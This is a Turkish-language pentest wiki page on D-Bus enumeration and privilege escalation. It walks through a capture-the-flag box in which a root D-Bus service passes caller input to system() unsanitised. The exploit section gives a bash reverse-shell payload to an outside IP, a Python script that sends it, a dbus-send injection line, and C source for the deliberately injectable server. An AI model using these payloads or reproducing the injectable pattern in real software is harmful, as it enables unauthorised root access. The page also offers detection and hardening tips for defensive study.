# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI numaralandırması**

D-Bus, Ubuntu masaüstü ortamlarında süreçler arası iletişim (IPC) aracısı olarak kullanılır. Ubuntu'da aynı anda birden fazla message bus çalışır: öncelikle **ayrıcalıklı hizmetlerin sistem genelinde ilgili hizmetleri sunmak için kullandığı** system bus ve oturum açmış her kullanıcıya ait, yalnızca o kullanıcıyla ilgili hizmetleri sunan bir session bus. Burada öncelikli olarak system bus'a odaklanıyoruz; çünkü hedefimiz ayrıcalıkları yükseltmek olduğundan, bu bus daha yüksek ayrıcalıklarla (ör. root) çalışan hizmetlerle ilişkilidir. D-Bus mimarisinde her session bus için bir 'router' bulunur; bu router, istemcilerin iletişim kurmak istedikleri hizmet için belirttiği adrese göre istemci mesajlarını uygun hizmetlere yönlendirir.<sup>[[1]](#references)</sup>

D-Bus üzerindeki hizmetler, sundukları **nesneler** ve **arayüzler** ile tanımlanır. Nesneler, standart OOP dillerindeki sınıf örneklerine benzetilebilir; her örnek, benzersiz bir **nesne yolu** ile tanımlanır. Dosya sistemi yoluna benzeyen bu yol, hizmetin sunduğu her nesneyi benzersiz şekilde tanımlar. Araştırma amacıyla önemli bir arayüz, tek bir yöntemi (Introspect) bulunan **org.freedesktop.DBus.Introspectable** arayüzüdür. Bu yöntem, nesnenin desteklediği yöntemlerin, sinyallerin ve özelliklerin XML gösterimini döndürür. Burada özellikleri ve sinyalleri kapsam dışında tutup yöntemlere odaklanıyoruz.

D-Bus arayüzüyle iletişim kurmak için iki araç kullanıldı: D-Bus tarafından sunulan yöntemleri betiklerde kolayca çağırmaya yarayan **gdbus** adlı bir CLI aracı ve her bus'ta bulunan hizmetleri numaralandırıp her hizmetin içerdiği nesneleri görüntülemek için tasarlanmış Python tabanlı bir GUI aracı olan [**D-Feet**](https://wiki.gnome.org/Apps/DFeet).

```bash
sudo apt-get install d-feet
```

**session bus**'ı kontrol ediyorsanız, önce mevcut adresi doğrulayın:

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

İlk görselde, System Bus düğmesi seçildikten sonra özellikle vurgulanan **org.debin.apt** ile D-Bus system bus'a kayıtlı servisler gösteriliyor. D-Feet bu servisi nesneler için sorguluyor ve ikinci görselde seçilen nesnelere ait arayüzleri, method'ları, özellikleri ve sinyalleri görüntülüyor. Her method'un imzası da ayrıntılı olarak gösteriliyor.

Dikkat çeken bir özellik, servisin **process ID'sinin (pid)** ve **command line'ının** gösterilmesidir. Bu bilgiler, servisin yükseltilmiş ayrıcalıklarla çalışıp çalışmadığını doğrulamak için yararlıdır ve araştırma açısından önem taşır.

**D-Feet method çağrısına da izin verir**: kullanıcılar parametre olarak Python ifadeleri girebilir; D-Feet bunları servise iletmeden önce D-Bus türlerine dönüştürür.

Ancak bazı method'ları çağırmadan önce **kimlik doğrulaması gerektiğini** unutmayın. Amacımız zaten kimlik bilgileri olmadan ayrıcalıklarımızı yükseltmek olduğundan, bu method'ları göz ardı edeceğiz.

Ayrıca bazı servislerin, kullanıcının belirli eylemleri gerçekleştirmesine izin verilip verilmeyeceğini öğrenmek için org.freedeskto.PolicyKit1 adlı başka bir D-Bus servisini sorguladığını unutmayın.

## **Cmd line Enumeration**

### Servis Nesnelerini Listeleme

Açık D-Bus arayüzlerini şu komutla listelemek mümkündür:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

**`(activatable)`** olarak işaretlenmiş servisler özellikle ilgi çekicidir; çünkü **henüz çalışmıyorlardır**, ancak bir bus isteğiyle ihtiyaç duyulduğunda başlatılabilirler. `busctl list` komutuyla yetinmeyin; bu adları çalıştıracakları gerçek binary’lerle eşleştirin.

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

Bu, etkinleştirilebilir bir ad için hangi `Exec=` yolunun hangi kimlik altında başlatılacağını hızla gösterir. İkili dosya veya yürütme zinciri zayıf korunuyorsa, etkin olmayan bir hizmet yine de ayrıcalık yükseltme yolu hâline gelebilir.

Ayrıcalıklı bir USB görüntüleme hizmeti için sistem veri yolu adını, görüntü yazma eylemine yönelik **etkin** politikayla ilişkilendirin. Eski bir üretici kuralı, yönetici Unix grubuna parola istemeden `ResultActive=yes` verebilir; mevcut hesabın bu gruba dahil olduğunu, oturumun etkin olduğunu, kuralın gerçekten yüklendiğini ve başka bir kuralla geçersiz kılınmadığını ve kurulu helper'ın arayan tarafından seçilen kaynak ve hedef yollarını hâlâ kabul ettiğini doğrulayın. Hizmet tanımlayıcısı veya eski bir paket sürümü tek başına rastgele dosyalara erişimi kanıtlamaz. Etkinleştirme tanımlayıcısının eksik olması, çalışan bir hizmetin zaten mevcut olmadığını da göstermez. Görüntü yazma yöntemini çağırmadan sabit politika ve hizmet dosyalarını inceleyin; [orijinal hizmet analizine](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) bakın.

#### Bağlantılar

[Vikipedi'den:](https://en.wikipedia.org/wiki/D-Bus) Bir süreç bir veri yoluna bağlantı kurduğunda, veri yolu bu bağlantıya _unique connection name_ adı verilen özel bir veri yolu adı atar. Bu tür veri yolu adları değiştirilemez; bağlantı var olduğu sürece değişmeyecekleri garanti edilir ve daha da önemlisi, veri yolunun ömrü boyunca yeniden kullanılamazlar. Bu, aynı süreç veri yoluna olan bağlantısını kapatıp yeni bir bağlantı oluştursa bile, o veri yoluna başka hiçbir bağlantıya böyle benzersiz bir bağlantı adı atanmayacağı anlamına gelir. Benzersiz bağlantı adlarını tanımak kolaydır; çünkü başka durumlarda yasak olan iki nokta karakteriyle başlarlar.<sup>[[4]](#references)</sup>

### Hizmet Nesnesi Bilgileri

Ardından, arayüz hakkında şu komutla bilgi edinebilirsiniz:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

Ayrıca bus adını ilgili `systemd` birimi ve çalıştırılabilir dosya yolu ile eşleştirin:

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

Bu, privesc sırasında önemli olan operasyonel soruyu yanıtlar: **Bir method call başarılı olursa, işlemi hangi gerçek binary ve unit gerçekleştirecek?**

### Bir Service Object'in Arayüzlerini Listeleme

Yeterli izne sahip olmanız gerekir.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Bir Servis Nesnesinin Arayüzünü İnceleme

Bu örnekte, `tree` parametresi kullanılarak keşfedilen en son arayüzün seçildiğine dikkat edin (_önceki bölüme bakın_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

`htb.oouch.Block` arayüzünün (ilgilendiğimiz arayüz) `.Block` metoduna dikkat edin. Diğer sütunlardaki “s” harfi, bir string beklediği anlamına gelebilir.

Tehlikeli bir şey denemeden önce, **okuma odaklı** veya başka bir düşük riskli metodu doğrulayın. Bu, yanlış sözdizimi, erişilebilir ancak reddedilmiş olma ya da erişilebilir ve izin verilmiş olma durumlarını net biçimde birbirinden ayırır.

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### D-Bus Yöntemlerini Politikalar ve Eylemlerle İlişkilendirme

Introspection, **neleri** çağırabileceğinizi söyler; ancak bir çağrıya **neden** izin verildiğini veya reddedildiğini söylemez. Gerçek privesc triyajı için genellikle **üç katmanı** birlikte incelemeniz gerekir:

1. **Activation metadata** (`.service` files veya `SystemdService=`): Hangi ikilinin ve birimin gerçekten çalışacağını öğrenmek için.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`): Kimlerin `own`, `send_destination` veya `receive_sender` kullanabileceğini öğrenmek için.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`): Varsayılan yetkilendirme modelini (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`) öğrenmek için.

Yararlı komutlar:

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

Do **not** assume a D-Bus method and a Polkit action map 1:1. The same method may choose a different action depending on the object being modified or the runtime context. Therefore, the practical workflow is:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` and grep the relevant `.policy` files
3. low-risk live probes with `busctl call`, `gdbus call`, or `dbusmap --enable-probes --null-agent`

Proxy or compatibility services deserve extra attention. A **root-running proxy** that forwards requests to another D-Bus service over its own pre-established connection can accidentally make the backend treat every request as coming from UID 0 unless the original caller identity is re-validated.<sup>[[3]](#references)</sup>

### İzleme/Yakalama Arayüzü

Yeterli ayrıcalıklarla (yalnızca `send_destination` ve `receive_sender` ayrıcalıkları yeterli değildir) bir **D-Bus iletişimini izleyebilirsiniz**.

Bir **iletişimi izlemek** için **root** olmanız gerekir. Root olduğunuz hâlde hâlâ sorun yaşıyorsanız [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) ve [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) sayfalarını inceleyin.

> [!WARNING]
> D-Bus yapılandırma dosyasını, root olmayan kullanıcıların iletişimi **dinlemesine izin verecek** şekilde nasıl yapılandıracağınızı biliyorsanız lütfen **benimle iletişime geçin**!

İzlemenin farklı yolları:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

Aşağıdaki örnekte `htb.oouch.Block` arayüzü izlenir ve **mesaj "**_**lalalalal**_**" iletişim hatası nedeniyle gönderilir**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

Wireshark’in açabileceği bir **pcapng** dosyasına sonuçları kaydetmek için `monitor` yerine `capture` kullanabilirsiniz:

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### Tüm gürültüyü filtreleme <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Bus üzerinde çok fazla bilgi varsa, şöyle bir match rule kullanın:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

Birden fazla kural belirtilebilir. Bir ileti kurallardan _herhangi biriyle_ eşleşirse ileti yazdırılır. Örneğin:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

Daha fazla bilgi için [D-Bus belgelerine](http://dbus.freedesktop.org/doc/dbus-specification.html) bakın; burada eşleşme kuralı sözdizimi açıklanıyor.<sup>[[7]](#references)</sup>

### Daha Fazla

`busctl` daha da fazla seçeneğe sahiptir, [**hepsini burada bulabilirsiniz**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Savunmasız Senaryo**

HTB'deki "oouch" host'u içinde **qtc** kullanıcısı olarak, _/etc/dbus-1/system.d/htb.oouch.Block.conf_ konumunda bulunan **beklenmedik bir D-Bus yapılandırma dosyası** bulabilirsiniz:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

Önceki yapılandırma notundan, bu D-BUS iletişimi üzerinden bilgi gönderip almak için `root` veya `www-data` kullanıcısı olmanız gerektiğini unutmayın.

Docker container **aeb4525789d8** içinde **qtc** kullanıcısı olarak _/code/oouch/routes.py_ dosyasında D-BUS ile ilgili kod bulabilirsiniz. İlgi çekici kod şu şekildedir:

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

Gördüğünüz gibi, bir **D-Bus interface'e bağlanıyor** ve **"Block" fonksiyonuna** "client_ip" değerini gönderiyor.

D-Bus bağlantısının diğer tarafında çalışan, C ile derlenmiş bir binary bulunuyor. Bu kod, D-Bus bağlantısında **IP adresini dinliyor ve verilen IP adresini engellemek için `system` fonksiyonunu kullanarak iptables'ı çağırıyor**.\
**`system` çağrısı bilerek command injection'a açık bırakılmıştır**, bu nedenle aşağıdaki gibi bir payload reverse shell oluşturur: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit edin

Bu sayfanın sonunda D-Bus uygulamasının **tam C kodunu** bulabilirsiniz. Kodun 91-97. satırları arasında **`D-Bus object path`** ve **`interface name`** değerlerinin nasıl **kaydedildiğini** görebilirsiniz. Bu bilgiler, D-Bus bağlantısına bilgi göndermek için gereklidir:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

Ayrıca, 57. satırda bu D-Bus iletişimi için **kaydedilmiş tek yöntemin** `Block` olarak adlandırıldığını görebilirsiniz (_**Bu nedenle, sonraki bölümde payload'lar `htb.oouch.Block` service object'ine, `/htb/oouch/Block` interface'ine ve `Block` method adına gönderilecek**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

Aşağıdaki python kodu, payload'ı `block_iface.Block(runme)` aracılığıyla D-Bus bağlantısındaki `Block` metoduna gönderir (_önceki kod parçasından çıkarıldığını unutmayın_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl and dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send`, “Message Bus”a mesaj göndermek için kullanılan bir araçtır.
- Message Bus – Uygulamalar arasındaki iletişimi kolaylaştırmak için sistemlerin kullandığı bir yazılımdır. Message Queue ile ilişkilidir (mesajlar sıralı biçimde dizilir), ancak Message Bus’ta mesajlar abonelik modeliyle ve çok hızlı gönderilir.
- “-system” etiketi, bunun varsayılan olarak bir session mesajı değil, sistem mesajı olduğunu belirtir.
- “–print-reply” etiketi, mesajımızı uygun biçimde yazdırır ve varsa yanıtları insanlar tarafından okunabilir bir biçimde alır.
- “–dest=Dbus-Interface-Block”, D-Bus arayüzünün adresidir.
- “–string:” – Arayüze göndermek istediğimiz mesajın türüdür. double, bytes, booleans, int ve objpath gibi çeşitli mesaj biçimleri vardır. Bunlardan “object path”, D-Bus arayüzüne bir dosya yolu göndermek istediğimizde kullanışlıdır. Bu durumda, dosya adı biçiminde arayüze bir komut iletmek için özel bir dosya (FIFO) kullanabiliriz. “string:;” – FIFO reverse shell dosyasının/komutunun konumunu belirttiğimiz object path’i yeniden çağırmak için kullanılır.

_Dikkat: `htb.oouch.Block.Block` ifadesinin ilk kısmı (`htb.oouch.Block`) service object’i, son kısmı (`.Block`) ise method adını belirtir._

### C code

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## Otomatik Enumeration Yardımcıları (2023-2025)

Büyük bir D-Bus saldırı yüzeyinin `busctl`/`gdbus` ile manuel olarak enumeration işlemi kısa sürede zahmetli hâle gelir. Son birkaç yılda yayımlanan iki küçük FOSS aracı, red-team veya CTF çalışmalarında işleri hızlandırabilir:

### dbusmap ("D-Bus için Nmap")
* Yazar: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* C ile yazılmıştır; her nesne yolunu dolaşan, `Introspect` XML'ini alan ve bunu sahibi olan PID/UID ile eşleştiren tek bir statik binary'dir (<50 kB).<sup>[[5]](#references)</sup>
* Kullanışlı seçenekler:
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* Araç, korunmayan well-known name'leri `!` ile işaretleyerek sahiplenebileceğiniz (ele geçirebileceğiniz) servisleri veya ayrıcalıksız bir shell'den erişilebilen method çağrılarını anında gösterir.

### uptux.py
* Yazar: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* systemd unit'lerinde **ve** aşırı izin veren D-Bus policy dosyalarında (ör. `send_destination="*"`) *yazılabilir* yolları arayan, yalnızca Python kullanan bir script.<sup>[[6]](#references)</sup>
* Hızlı kullanım:
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* D-Bus modülü aşağıdaki dizinlerde arama yapar ve normal bir kullanıcının taklit edebileceği veya ele geçirebileceği hizmetleri vurgular:
  * `/etc/dbus-1/system.d/` ve `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/` (vendor geçersiz kılmaları)

---

## Dikkat Çeken D-Bus Yetki Yükseltme Açıkları (2024-2025)

Yakın zamanda yayımlanan CVE'leri takip etmek, özel kodlardaki benzer güvensiz kalıpları fark etmeye yardımcı olur. Yakın tarihli iki iyi örnek:<sup>[[2]](#references)[[3]](#references)</sup>

| Yıl | CVE | Bileşen | Temel Neden | Saldırı açısından çıkarım |
|------|-----|-----------|------------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root olarak çalışan hizmet, ayrıcalıksız kullanıcıların yeniden yapılandırabildiği bir D-Bus arayüzünü açığa çıkardı. Bu işlemler arasında saldırganın kontrolündeki makro davranışlarının yüklenmesi de vardı. | Bir daemon system bus üzerinde **cihaz/profil/yapılandırma yönetimi** sunuyorsa, yazılabilir yapılandırmaları ve makro özelliklerini yalnızca "ayarlar" olarak değil, kod yürütme ilkelleri olarak değerlendirin. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root olarak çalışan uyumluluk proxy'si, özgün çağıranın güvenlik bağlamını korumadan arka uç hizmetlerine istekleri iletti; bu nedenle arka uçlar proxy'yi UID 0 olarak kabul etti. | **Proxy / bridge / uyumluluk** D-Bus hizmetlerini ayrı bir hata sınıfı olarak değerlendirin: ayrıcalıklı çağrıları iletiyorlarsa, çağıranın UID/Polkit bağlamının arka uca nasıl ulaştığını doğrulayın. |

Dikkat edilmesi gereken kalıplar:
1. Hizmet **system bus üzerinde root olarak çalışır**.
2. Ya **yetkilendirme kontrolü yoktur** ya da kontrol **yanlış özne** üzerinden yapılır.
3. Erişilebilen yöntem eninde sonunda sistem durumunu değiştirir: paket kurulumu, kullanıcı/grup değişiklikleri, bootloader yapılandırması, cihaz profili güncellemeleri, dosya yazma veya doğrudan komut yürütme.

Bir yöntemin erişilebilir olup olmadığını doğrulamak için `dbusmap --enable-probes` veya elle `busctl call` kullanın; ardından **hangi öznenin** gerçekten yetkilendirildiğini anlamak için hizmetin policy XML'ini ve Polkit eylemlerini inceleyin.

---

## Güçlendirme ve Tespit İçin Hızlı Kazanımlar

* Dünya tarafından yazılabilir veya *send/receive* erişimine açık politikaları arayın:
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* Tehlikeli yöntemler için Polkit zorunlu kılın — *root* proxy’ler bile `polkit_authority_check_authorization_sync()` işlevine kendi PID’leri yerine *çağıranın* PID’sini iletmelidir.
* Uzun süre çalışan yardımcı süreçlerde ayrıcalıkları düşürün (bus’a bağlandıktan sonra namespace’leri değiştirmek için `sd_pid_get_owner_uid()` kullanın).
* Bir servisi kaldıramıyorsanız en azından onu özel bir Unix grubuyla *sınırlandırın* ve XML politikasında erişimi kısıtlayın.
* Blue-team: anomali tespiti için sistem bus’ını `busctl capture > /var/log/dbus_$(date +%F).pcapng` ile kaydedin ve Wireshark’a aktarın.

---

## References

